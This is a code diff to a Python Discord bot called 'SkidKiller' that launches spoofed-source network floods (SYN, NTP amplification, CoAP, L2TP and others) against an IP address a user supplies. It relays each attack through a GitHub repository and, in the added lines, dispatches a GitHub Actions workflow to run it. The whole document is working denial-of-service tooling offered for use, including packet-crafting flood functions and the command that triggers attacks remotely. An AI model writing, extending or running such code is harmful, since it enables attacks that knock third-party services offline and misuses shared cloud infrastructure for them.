@@ -21,8 +21,8 @@ REPO_NAME = "KomaVR/SkidKiller"
 BRANCH = "main"
 CONFIG_FILE = "trigger.json"
 
-g = Github(GH_TOKEN)
-repo = g.get_repo(REPO_NAME)
+repo_client = Github(GH_TOKEN)
+repo = repo_client.get_repo(REPO_NAME)
 session = requests.Session()
 
 intents = discord.Intents.default()
@@ -35,6 +35,8 @@ working_methods = [
     "l2tp_flood", "sctp_chunk_storm", "isakmp_flood", "ntp_amplify",
     "malformed_http_headers", "tcp_option_abuse", "coap_flood"
 ]
+
+method_map = {name: globals()[name] for name in working_methods}
 
 def tcp_chained_syn(ip, port=80):
     spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
@@ -128,8 +130,6 @@ def coap_flood(ip, port=5683):
     coap = bytes([0x40 | msg_type, code]) + msg_id + token
     send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)
 
-method_map = {name: globals()[name] for name in working_methods}
-
 def runner_mode():
     cfg = json.load(open(CONFIG_FILE))
     func = method_map.get(cfg["method"])
@@ -178,11 +178,13 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
                 repo.create_file(CONFIG_FILE, "Create trigger.json", content, branch=BRANCH)
             else:
                 raise
+        workflow = repo.get_workflow("skidkiller.yml")
+        workflow.create_dispatch(ref=BRANCH)
         await interaction.response.send_message(
-            f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s)"
+            f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s) and dispatched workflow"
         )
     except Exception as e:
-        await interaction.response.send_message(f"❌ GitHub error: {e}", ephemeral=True)
+        await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)
 
 @bot.tree.command(name="help", description="List methods")
 async def help_cmd(interaction: discord.Interaction):
@@ -205,4 +207,3 @@ if __name__ == "__main__":
         runner_mode()
     else:
         bot.run(DISCORD_TOKEN)
-    
